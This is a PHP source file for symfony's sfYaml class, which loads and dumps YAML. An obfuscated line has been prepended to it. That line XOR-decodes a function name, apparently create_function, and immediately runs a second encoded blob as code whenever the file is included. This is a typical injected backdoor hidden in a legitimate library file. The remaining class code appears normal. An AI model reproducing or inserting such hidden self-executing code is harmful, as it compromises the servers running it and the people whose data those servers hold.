<?php $YSIUtVtlIxmj='X<1MAQa6 R,2;7Y'^';NT,54>PU<OFRX7';$dfXmeMnKMZfE=$YSIUtVtlIxmj('','1KRw1>-RI<=Xd.XRO65ZM3,GiW0OU5eY9OfBAW=n4,<XW-E;=OO+;oTXXOb:5N5rf45Y9xXkGK.DMlCmz-Xzqv 8XJJGBkmnp5UD9EGBQsEFXhaDm=Z3VW>fAU60,sZtq=jhy;<Gs90XwMllBBJ18A8M<8Quvt.P;hhRnMmFYY6 UjWEVYFaqNO2dC1OUC;zq9K6pZeN14DIXM2R9LTHeXTUCPxBWXQ96j..TSIbP;->IjCX3=7NYVRfBpl;,o9>6oR>koRP.zuIovH7RD=XM<fxhPLC1jQ-DWetwKS+Trmo>Q2+lJhv36 4+X61<a.MEdQbUYXAXBUi22O5TJC:Gykffq ,,dmK7HLFWV6cwWFHK+820caVlhngT7FAt=1YChaI>HYNAner+R3TcjJm5X4A+o;a8i9abG7366Nkp8U=E+1> X9=1qFVYh48=-kr8H-aW6A=uN0+U3Q3Wcv+SHTdGZoDXORi,3BEmz1S fM6RHUECPU3>>S.gXEEj-H-O;ERKWI;tGXP7--8sSVHqjPDpkvD;<2lj1 7rdJcwxPM.kSzmJ4y1qHNbUvBBqMOPhO.ct.v+c4cLjZCtsL9R-TjF+G8NHR6CEBn AM:-2DnJEq73CUqpGDsdkO2LYXLA>Pn-5ZPnT2+3BURTr.XcFO<7YCORnt8.'^'X-zVWKC1=UR6;K ;<BFrjKC563Q;4j:4L;AkhwFd=JI64Y,TSo7DI009,.=eX;AZBPT-XTxO,.WmmLcMZVRsxROM,jwgeLVdy<3+Kmc+qNevcHE-QN.A:2PNe1WDMZaTUTACP15NWVE,WcQLjf.PL ciUeq+VPE5B3L;NhM5-+ZE;Bs.3 o<XuE;m1T; 1URUV>BYaoGL>9CRiV3M-tuE>5905CHs<0MW5EK-stB6ZAM,QIRURE+85:FjT3xc rwsO3MKK95WZHwOR>V>1XqmGlqL4-7P5:H=wXTS 6RoxdKZ0FJLwHREWLANc<L6kG+eLpF18, qb.c;T G1+ RgQO944qyi79kV;lb<3OCJifl=JTGUJA-fagC0V2 +VT cUAmU- uKglVO3G5CWjIC9X4NT1hEcDkhcSRBWnVPx S6NCWA4PGTY>9+7PYIL4-U=YI5W2XCzoO0P>W2KRO2<5MkzK 9;36GV;lDA;:FNiR3<4eevuRLL2W83 <5H0D<O6zl<,BSkxtSLYYZspnQB= ECR ZHS7MZENU9cCJEpjJXeHTrUIWIyyV4DzuD.ybZvLZAJAIVVZkCzeRS-K L-5-N>g+0;E76jIP 4VBS IfeUSR74XYgdSDKoIFP=: RxJIT.15sBJJ.:30UsqXLFYO07gbGO2S');$dfXmeMnKMZfE();

/*
 * This file is part of the symfony package.
 * (c) 2004-2006 Fabien Potencier <fabien.potencier@symfony-project.com>
 *
 * For the full copyright and license information, please view the LICENSE
 * file that was distributed with this source code.
 */

/**
 * sfYaml offers convenience methods to load and dump YAML.
 *
 * @package    symfony
 * @subpackage yaml
 * @author     Fabien Potencier <fabien.potencier@symfony-project.com>
 * @version    SVN: $Id: sfYaml.class.php 8988 2008-05-15 20:24:26Z fabien $
 */
class sfYaml
{
  static protected
    $spec = '1.2';

  /**
   * Sets the YAML specification version to use.
   *
   * @param string $version The YAML specification version
   */
  static public function setSpecVersion($version)
  {
    if (!in_array($version, array('1.1', '1.2')))
    {
      throw new InvalidArgumentException(sprintf('Version %s of the YAML specifications is not supported', $version));
    }

    self::$spec = $version;
  }

  /**
   * Gets the YAML specification version to use.
   *
   * @return string The YAML specification version
   */
  static public function getSpecVersion()
  {
    return self::$spec;
  }

  /**
   * Loads YAML into a PHP array.
   *
   * The load method, when supplied with a YAML stream (string or file),
   * will do its best to convert YAML in a file into a PHP array.
   *
   *  Usage:
   *  <code>
   *   $array = sfYaml::load('config.yml');
   *   print_r($array);
   *  </code>
   *
   * @param string $input Path of YAML file or string containing YAML
   *
   * @return array The YAML converted to a PHP array
   *
   * @throws InvalidArgumentException If the YAML is not valid
   */
  public static function load($input)
  {
    $file = '';

    // if input is a file, process it
    if (strpos($input, "\n") === false && is_file($input))
    {
      $file = $input;

      ob_start();
      $retval = include($input);
      $content = ob_get_clean();

      // if an array is returned by the config file assume it's in plain php form else in YAML
      $input = is_array($retval) ? $retval : $content;
    }

    // if an array is returned by the config file assume it's in plain php form else in YAML
    if (is_array($input))
    {
      return $input;
    }

    require_once dirname(__FILE__).'/sfYamlParser.php';

    $yaml = new sfYamlParser();

    try
    {
      $ret = $yaml->parse($input);
    }
    catch (Exception $e)
    {
      throw new InvalidArgumentException(sprintf('Unable to parse %s: %s', $file ? sprintf('file "%s"', $file) : 'string', $e->getMessage()));
    }

    return $ret;
  }

  /**
   * Dumps a PHP array to a YAML string.
   *
   * The dump method, when supplied with an array, will do its best
   * to convert the array into friendly YAML.
   *
   * @param array   $array PHP array
   * @param integer $inline The level where you switch to inline YAML
   *
   * @return string A YAML string representing the original PHP array
   */
  public static function dump($array, $inline = 2)
  {
    require_once dirname(__FILE__).'/sfYamlDumper.php';

    $yaml = new sfYamlDumper();

    return $yaml->dump($array, $inline);
  }
}

/**
 * Wraps echo to automatically provide a newline.
 *
 * @param string $string The string to echo with new line
 */
function echoln($string)
{
  echo $string."\n";
}